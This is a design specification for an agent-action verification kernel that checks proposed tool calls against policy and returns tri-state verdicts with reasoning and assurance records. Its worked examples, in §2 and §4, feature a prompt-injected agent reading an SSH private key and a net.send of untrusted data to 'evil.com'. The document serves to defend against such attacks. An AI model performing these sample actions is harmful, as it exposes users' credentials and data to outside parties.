# Verity Kernel Spec

The buildable specification for the smallest unit that proves Verity's concept. Companion to the PRD (`Verity-PRD.md`) and the threat research (`verity-agent-action-verification.md`). This document is the contract for the first commit.

> Reconciled (June 2026) to the converged thesis and the harness beachhead. Verity is a **verification layer**, not a blocking layer. The kernel proves the runtime **verification primitive** — `verify(action, context, policy) → verdict + reasoning` — for the **catastrophe-floor beachhead** at an agent harness's tool-execution chokepoint. The encode-time compiler, the input-side **adapter**, and enforcement are layers *around* this primitive, not part of it.

## 1. Purpose

Build the smallest thing that proves the core loop: an agent harness is about to execute a tool call; Verity verifies the resolved action against an author-by-intent policy using the current context, and returns a verdict — conform / violate / indeterminate — with the reasoning. What the caller *does* with the verdict (block, escalate, hand the reasoning back to the agent to self-correct, log) is the caller's `if`-body, not the kernel's concern.

Two things are proven at once:

1. **The product** — Verity is the `if`-condition in an agent's execution path. `verify(action)` returns a verdict the harness or agent acts on. Safety knowledge lives in the *policy* (authored or learned); the kernel never infers it.
2. **The architecture bet** — the verifier evaluates a normalized action against context **deterministically**, fast enough for the agent's hot path, behind a thin harness adapter.

### Scope boundaries

- **In scope (the kernel):** parse a compiled policy (JSON), evaluate a normalized action against context, return verdict + reasoning + assurance. Two policy kinds: an **effect-category floor** (catastrophic actions, context-free) and a **provenance/context-aware envelope** (fires only under specific context, e.g. a tainted data path).
- **Out of scope (layers around the kernel):** the **adapter** that intercepts the harness hook, normalizes the raw tool call, gathers context, and maps the verdict onto the harness's controls (§7); the encode-time compiler (Z3 + LLM enumerating cases and circumvention pathways — §9); enforcement of any kind; the encode-time learned-personalization loop; the gateway; SDK bindings.

The kernel returns verdicts. It does not intercept, normalize, block, route, or enforce — those belong to the adapter and the caller.

## 2. The Proof Scenario (catastrophe floor)

Two checkable cases, both buildable on the kernel, neither requiring the encode-time compiler. They mirror the two policy kinds and, between them, exercise everything new: the normalized action, context with provenance, the honest tri-state, and the assurance record.

### 2.1 The effect-category floor (the 10-second gut punch)

A prompt-injected agent, "following instructions" from a web page it just read, proposes to read an SSH private key. The adapter has normalized the harness's tool call into a capability + resource:

```
action: { capability: "fs.read", resource: "/home/u/.ssh/id_rsa", effect: ["read","secret"] }
verify(action)
  → VIOLATE
    policy:      no_secret_reads
    disposition: deny
    reasoning:   "fs.read targets secret material (SSH private key);
                  reading secret material is on the catastrophe floor."
```

Pure policy over a declared effect category (`secret`). No context needed, no prediction. This is the floor under a confidently-wrong agent, and it is the simplest demo anyone feels in their gut — the same injection that fooled the agent cannot fool the verifier, because the verifier is not a model.

### 2.2 The provenance-aware envelope (the real one — and the honest one)

The agent tries to send data to an external destination. Exfiltration is only catastrophic when the data path carries **untrusted provenance** (the lethal trifecta: untrusted content + sensitive access + external effect). The policy is the expert's, written once; the kernel evaluates it against the current context:

```
context: { "taint.body": "untrusted" }
action:  { capability: "net.send", resource: "evil.com", args: { body: "<...>" } }
verify(action)
  → VIOLATE
    policy:      no_tainted_exfiltration
    disposition: require_approval
    reasoning:   "net.send to an external destination carrying untrusted-provenance
                  data (taint.body = untrusted) completes the lethal trifecta."
```

But provenance is exactly what most harnesses do **not** expose (the OpenClaw `before_tool_call` hook carries no taint). When the context cannot answer `taint.body`, the kernel does **not** guess:

```
context: { }                       # no provenance available
verify(action)  (same action)
  → INDETERMINATE
    missing:     ["taint.body"]
    disposition: escalate
    reasoning:   "cannot determine the provenance of net.send's payload; the
                  trifecta predicate is Unknown. Escalating rather than guessing."
    assurance:   { provenance: Unavailable, ... }
```

**§2.2 is the company:** Verity catches the contextual catastrophe an over-busy human would rubber-stamp — and, when it *can't* verify, says so honestly and escalates instead of silently allowing. The tri-state is not a weakness; it is the difference between a verifier and a coin flip.

### What this is NOT

Not a database-administration proof (the earlier draft's framing, retired with the harness pivot). Not enforcement — the kernel returns verdicts; the adapter and caller decide. Not semantic judgment — the floor is crisp, checkable predicates only (PRD §7.2).

## 3. Authoring Order — JSON Before Rust

Milestone M0 has no Rust. Hand-write `policies/floor.json` (§5) — both the effect-floor and the provenance envelope — and iterate until it reads well. This JSON is the *compiled* policy form the encode-time compiler (§9) will eventually generate; getting its shape right by hand now is cheap. Rust begins only once the shape is agreed.

## 4. Core Data Model

Rust sketches — illustrative, not final. `serde_json` only; no custom parser. Crate: **`verity-core`**.

```rust
// model.rs

/// A proposed agent action — the unit verify() evaluates.
/// Two levels: the raw harness-native call (retained, never interpreted by the kernel)
/// and the normalized, harness-neutral form the policy reads. The ADAPTER (§7) produces
/// the normalized form; the kernel only ever evaluates against it.
pub struct Action {
    pub raw: RawCall,                          // audit/reasoning only; opaque to the kernel
    pub capability: String,                    // "fs.read", "net.send", "process.spawn"
    pub resource: Option<Value>,               // "/home/u/.ssh/id_rsa", "evil.com", ...
    pub effect: Vec<String>,                   // declared categories: ["read","secret"]
    pub args: serde_json::Map<String, Value>,  // normalized args the policy may reference
    pub actor: Actor,
}

pub struct RawCall { pub tool: String, pub params: serde_json::Map<String, Value>, pub call_id: String }
pub struct Actor   { pub id: String, pub roles: Vec<String> }

/// Injected logical time — the kernel NEVER reads the wall clock (§11).
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub struct LogicalTime(pub i64);

/// The verification result. NOT an enforcement action — a verdict the caller acts on.
pub enum Verdict {
    Conform,
    Violate { policy: String, disposition: Disposition, reasoning: String, pathway: Option<Pathway> },
    Indeterminate { missing: Vec<String>, disposition: Disposition, reasoning: String },
}

/// The intended response, derived from the POLICY (not the adapter) so the safety
/// decision is authored once and identical across harnesses. The adapter maps this onto
/// whatever controls the harness offers, failing closed when it cannot express the intent (§7).
pub enum Disposition { Allow, Deny, RequireApproval, RequireContext, Escalate }

/// The circumvention pathway. In the kernel this is the violation explanation;
/// the encode-time compiler (§9) later enriches it with pre-enumerated evasion routes.
pub struct Pathway { pub description: String, pub detail: String }
```

`Verdict` carries the structural outcome **plus the policy-authored disposition**. There is no `block`/`deny`/`enforce` mechanism in the kernel — the disposition is an *intent*, and expressing it is the adapter's job, not the kernel's.

## 5. The Policy Format

Canonical JSON, `serde_json`-deserialized. The demo file carries both policy kinds:

```json
{
  "capabilities": {
    "fs.read":  { "inputs": { "path": "string" } },
    "net.send": { "inputs": { "to": "string", "body": "string" } }
  },

  "policies": {
    "no_secret_reads": {
      "rationale": "Reading secret material (keys, credentials, token stores) is on the floor",
      "on_capability": "fs.read",
      "when": { "is_secret": { "arg": "path" } },
      "verdict": "violate",
      "disposition": "deny"
    },

    "no_tainted_exfiltration": {
      "rationale": "External send of untrusted-provenance data completes the lethal trifecta",
      "on_capability": "net.send",
      "when": {
        "and": [
          { "is_external": { "arg": "to" } },
          { "eq": [ { "ctx": "taint.body" }, "untrusted" ] }
        ]
      },
      "verdict": "violate",
      "disposition": "require_approval"
    }
  }
}
```

`rationale` carries the intent in plain language — quoted in the verdict's reasoning, not a comment. Note the two operand sources: `{ "arg": ... }` (from the normalized action) and `{ "ctx": ... }` (from context — §6); a missing `ctx` field is Unknown and drives `Indeterminate`.

### Expression grammar (minimal, principled)

```
Expr ::=
  | Literal                          number | string | bool
  | { "arg": name }                  the normalized action's argument
  | { "ctx": field }                 context value (§6) — may be missing → Unknown
  | { "<op>": [Expr, Expr] }         add sub mul  |  gt ge lt le eq ne
  | { "and": [...] } | { "or": [...] } | { "not": Expr }    Kleene logic
  | { "<pred>": Expr }               named floor predicate: is_secret | is_external | ...
```

A policy fires when its `when` is True (→ its `verdict` + `disposition`); Unknown `when` → `Indeterminate`; False → conform-for-this-policy. **Named predicates** (`is_secret`, `is_external`, and later the semantic command resolver, PRD §11 OQ6) are the floor's resolution primitives; each is a pure, total, deterministic function — never a string match where semantics matter.

## 6. Context: the generalized state seam

The kernel evaluates against **context** — everything outside the action the policy may read: live system state, session facts, and **provenance/taint** on the action's data. Read at verify time, supplied by the adapter (§7).

```rust
// context.rs
pub trait Context {
    /// Read a context field. None → Unknown (drives Indeterminate, §10).
    fn get(&self, field: &str) -> Option<Value>;
}
```

Two implementations, two milestones:

- **M3 — `StaticContext`** (a JSON snapshot): proves evaluation logic without integration risk.
- **M6 — `HarnessContext`**: context surfaced by the adapter from the live harness hook (session facts, provenance where the harness exposes it). Provenance the harness does not expose → `get` returns `None` → `Unknown` → honest `Indeterminate` (§2.2). Cumulative cross-call state (e.g. aggregate spend) is *one kind* of context — a `Context` impl that folds an append-only log — not the kernel's center.

## 7. The Adapter (the input-side boundary the kernel sits behind)

The kernel is harness-neutral; one thin **adapter per harness** is the only harness-specific code. It is *out* of the kernel, the input-side mirror of enforcement on the output side. Its contract:

1. **Intercept** at the harness's pre-execution hook (OpenClaw: the `before_tool_call` hook, which is veto-capable and runs on the resolved action in the same critical section as dispatch).
2. **Normalize** the raw tool call → canonical `Action` (`{tool, params}` → `{capability, resource, effect, args}`). This mapping is harness- and tool-specific (e.g. OpenClaw `sessions_spawn` → `process.spawn`); a sloppy mapping is a blind spot, so it is the adapter's most safety-critical code.
3. **Gather context** (§6), including provenance/taint where the harness exposes it.
4. **Assert assurance** it can vouch for: atomicity (did it hand the kernel the resolved, immutable action?) and resolution (did it semantically resolve the action, or pass raw params?) — §8.
5. **Call** `verify(action, context, now, policy)`.
6. **Map the verdict + disposition onto the harness's controls.** The kernel emits an *intended* disposition; the adapter expresses it. When the harness's control surface is narrower than the disposition (OpenClaw offers only block/allow; it cannot express `escalate`), the adapter **collapses, failing closed for floor capabilities** (escalate → block, never escalate → allow) and **records the degradation in assurance** — a harness too poor to express the intent is a lower-assurance harness.

The adapter never makes the safety decision (that is the policy's, via disposition); it only translates intent to mechanism and reports honestly what it could and could not guarantee.

## 8. The Assurance Model (how strong is this verdict?)

A verdict is only as trustworthy as the chokepoint that produced it. Every verdict carries an **assurance** record so a `Conform` from a provenance-blind, binary-control harness is visibly weaker than one from a fully-instrumented hook — and the gap is the exact spec for what a harness must expose to earn a strong guarantee.

```rust
pub struct Assurance {
    pub atomicity:  Atomicity,    // adapter-asserted: ResolvedImmutable | BestEffort
    pub resolution: Resolution,   // adapter-asserted: Semantic | RawOnly
    pub provenance: Provenance,   // kernel-derived: Present | Unavailable
    pub context:    Completeness, // kernel-derived: Complete | Partial(Vec<String>)
}
```

- **Adapter-supplied** (the kernel records, does not judge): `atomicity` (was the action resolved and immutable in the dispatch critical section — TOCTOU-free?), `resolution` (did the adapter resolve the action's semantics, e.g. parse a command, vs. pass raw params?).
- **Kernel-derived** (computed during evaluation): `provenance` (were any provenance/taint context fields requested by a fired policy and found?), `context` (which referenced `ctx` fields were Unknown).

Assurance is honest scope made machine-readable. It never changes the verdict; it qualifies it.

## 9. Encode Time vs Runtime (the boundary the kernel sits on)

The full product has two phases; the kernel is only the second:

- **Encode time (NOT in the kernel):** the user expresses a policy as intent. A compiler uses Z3 + an LLM to enumerate the cases that need handling and the **circumvention pathways**, and emits the compiled policy JSON (§5) plus an evasion catalog. Expensive, one-time per policy version. This is the *only* place a solver or LLM runs.
- **Runtime (THE KERNEL):** `verify(action, context, policy)` evaluates against the compiled policy and current context. Fast, deterministic, **no Z3, no LLM in the hot path.**

The kernel produces the *violation reasoning* (why this action violates). The encode-time compiler later enriches `Pathway` with pre-enumerated evasion routes; explaining a rejection is safe *because* that enumeration already closed the evasion space — but completeness is an encode-time concern, and the kernel just reports the violation it found.

## 10. The Verify Function & Tri-State

```rust
// verify.rs

/// PURE. Deterministic in (action, context, now, policies, assurance_in).
/// No I/O, no clock, no globals.
pub fn verify(
    action: &Action,
    context: &dyn Context,
    now: LogicalTime,
    policies: &PolicySet,
    assurance_in: AdapterAssurance,   // atomicity + resolution the adapter vouches for
) -> VerdictReport;
```

Predicates evaluate to `True | False | Unknown` (Kleene logic). `Unknown` arises when a `{ "ctx": ... }` field is missing — e.g. the harness exposes no provenance. It propagates; a policy whose `when` is Unknown yields `Indeterminate { missing }`. This is the honest "I can't verify this" outcome — the caller decides what it means (escalate), the kernel never guesses.

Resolution across policies: any `violate` fires → `Violate` (most-specific/first wins, with all contributing policies in the report). Else any Unknown → `Indeterminate`. Else `Conform`. The kernel expresses no preference about what the caller does — that is the `if`-body.

`Unknown` is also the neurosymbolic seam: today `{ "ctx": x }` binds from the adapter's context read; later a predicate may bind from an LLM classifier with a confidence threshold, low confidence → `Unknown`. The kernel does not change; the binding source does. A `binding` provenance field on each evaluated predicate (`live` now; `inferred | confirmed` later) reserves the seam.

## 11. Determinism Constraints (Non-Negotiable, Day One)

Free now, expensive to retrofit; the simulator/gap-finder depends on all three. (The lineage lesson — a deterministic verifier that silently returns a wrong verdict is worse than none — is internalized here, not imported.)

1. **Pure function.** `verify` is a pure function of its arguments. No `SystemTime::now()`, no RNG, no I/O, no mutable globals.
2. **Virtual time.** Logical time is injected via `LogicalTime`; the kernel never reads a real clock.
3. **Seeded determinism end-to-end.** Same inputs → same `VerdictReport`, byte-for-byte.

A replay test (M7) runs a fixed action+context sequence twice and asserts identical verdicts.

## 12. Verdict Output (the audit artifact)

```rust
pub struct VerdictReport {
    pub action: RawCall,                  // the raw call, for the audit trail
    pub verdict: Verdict,                 // structural outcome + disposition
    pub evaluated: Vec<PolicyEval>,       // every policy considered, with its result
    pub ctx_used: Vec<(String, Value)>,   // which context fields were read (provenance of the verdict)
    pub assurance: Assurance,             // §8 — how strong this verdict is
    pub time: LogicalTime,
}

pub struct PolicyEval {
    pub policy: String,
    pub rationale: String,                // quoted from the policy
    pub result: TriBool,
    pub detail: String,                   // "path '/home/u/.ssh/id_rsa' matched is_secret"
    pub binding: Provenance,              // live (neural-seam stub, §10)
}
```

Two consumers: the **agent** (reads the reasoning/pathway and self-corrects its tool call in real time, then re-verifies) and the **engineer** (reviews the verdict later in a trace). The report is the same; the consumer differs.

## 13. Crate Layout & Dependencies

```
verity-core/
  Cargo.toml
  policies/
    floor.json             # M0 — hand-written first (effect floor + provenance envelope)
  src/
    lib.rs
    model.rs               # Action, RawCall, Actor, Verdict, Disposition, Pathway, LogicalTime
    policy.rs              # PolicySet, Policy, capability schema (serde)
    expr.rs                # Expr, TriBool, Kleene logic, named floor predicates
    context.rs             # Context trait, StaticContext, (later) HarnessContext
    assurance.rs           # Assurance, AdapterAssurance
    verify.rs              # verify(), resolution
  examples/
    floor.rs               # the proof binary (§2 output)
  tests/
    effect_floor.rs        # secret read → Violate (§2.1)
    tainted_exfil.rs       # external send w/ taint → Violate; w/o taint → Indeterminate (§2.2)
    determinism.rs         # M7 replay test
```

Dependencies: `serde`, `serde_json`, `thiserror`. Added later: the harness adapter (its own crate, per harness) and — only at encode time — the solver/LLM. No solver, no LLM, no async in the kernel — synchronous and tiny.

## 14. Build Milestones

The proof is **M3** (static) / **M6** (live harness).

| M | Deliverable | Acceptance test |
|---|---|---|
| M0 | Hand-written `floor.json` (effect floor + provenance envelope) | Reads cleanly; reviewed |
| M1 | Data model + serde deserialization | Round-trips `floor.json` |
| M2 | Expression eval + effect-category matching + named predicates, two-valued | `fs.read` on a secret path → `Violate` (§2.1) |
| M3 | `StaticContext` + provenance-aware envelope | Tainted external send over static context → `Violate` (§2.2 case 1) |
| M4 | Tri-state + `Indeterminate` | Missing `taint.body` → `Indeterminate`, not silent conform (§2.2 case 2) |
| M5 | `VerdictReport` + disposition + reasoning/pathway + assurance rendering | §2 verdicts render with quoted rationale, disposition, and assurance |
| M6 | `HarnessContext` + OpenClaw adapter over `before_tool_call` | Both proofs pass on a live OpenClaw tool call; verdict maps to the hook's block/allow |
| M7 | Determinism harness | Replay-twice asserts identical verdicts |

After M7 every later layer attaches to a seam already present: the `Context` trait (live + provenance + cumulative + future sources), the tri-state binding (neural classifiers), the pure `verify` (the adapter hot path), the `Pathway` (encode-time evasion enrichment), `Disposition`/`Verdict` (the adapter's control mapping), `Assurance` (the harness-quality report).

## 15. How the Kernel Grows (seams already present)

| Kernel piece | Grows into |
|---|---|
| `verify → Verdict` (no enforcement) | The `if`-condition; the adapter wires the body to the harness's controls |
| `effect: [...]` + effect-category policy | The catastrophe floor; effect ontology over Strata's graph |
| `{ "ctx": ... }` + `Context` trait | Live context + provenance adapters; cumulative aggregates |
| Named predicates (`is_secret`, `is_external`) | The semantic command resolver (defeating lexical bypass, PRD OQ6) |
| Provenance-aware envelopes | The lethal-trifecta floor; learned per-user boundaries |
| `Pathway` (violation reasoning) | Encode-time Z3+LLM evasion enumeration; agent self-correction signal |
| `Disposition` | The adapter's verdict→harness-control mapping; approval/escalation flows |
| `Assurance` | The honest-scope report; the spec for what a harness must expose |
| `TriBool` + `binding` | Neural classifier binding; Unknown → caller escalates |
| Determinism | The gap-finder ("does the floor have holes?") and the encode-time simulator |

Nothing above reworks the kernel — each is a new consumer of an existing seam.

## 16. Open Implementation Questions

**Decide before M3:**
1. **Numbers** — `i64` minor units (cents / bytes as integers), not `f64`: aggregates plus floats invite drift. Ratify before M3.
2. **The normalized capability taxonomy** — the closed set of `capability` strings and `effect` categories the floor evaluates against (`fs.read`, `net.send`, `process.spawn`, `config.write`, ...), and the OpenClaw tool→capability mapping for the adapter. This is the central design question for the beachhead.
3. **Named-predicate set** — the minimum floor predicates (`is_secret`, `is_external`) and their deterministic definitions (secret-path matching; external-destination/allowlist matching).

**Build-shaping:**
4. `LogicalTime` units — recommend logical millis from the start.
5. Policy/capability JSON Schema validation — load-time (recommended) vs. deserialize-and-trust; M1 or M5.
6. Verdict resolution when multiple `violate` policies fire — return all in the report; confirm ordering is deterministic.
7. Where the adapter-supplied vs kernel-derived halves of `Assurance` are assembled — proposed: adapter constructs `AdapterAssurance`, kernel returns the combined `Assurance` in the report.

## 17. Definition of Done

The kernel is proven when, on a live OpenClaw tool call (M6) with the hand-written `floor.json` (M0), the example binary emits the two §2 verdicts — a normalized `fs.read` on a secret path → `Violate` on the effect floor (disposition `deny`), and an external `net.send` that returns `Violate` (disposition `require_approval`) when provenance shows untrusted data and `Indeterminate` (disposition `escalate`) when provenance is unavailable — each carrying quoted rationale and an assurance record, and the verdict mapped onto the hook's block/allow with fail-closed collapse where needed; and the determinism test (M7) passes. At that point Verity does the core thing: it **verifies** an agent's proposed action against author-by-intent policy using current context, returns a verdict with reasoning and honest assurance, and leaves enforcement to the caller — behind a thin harness adapter, with no model in the hot path.
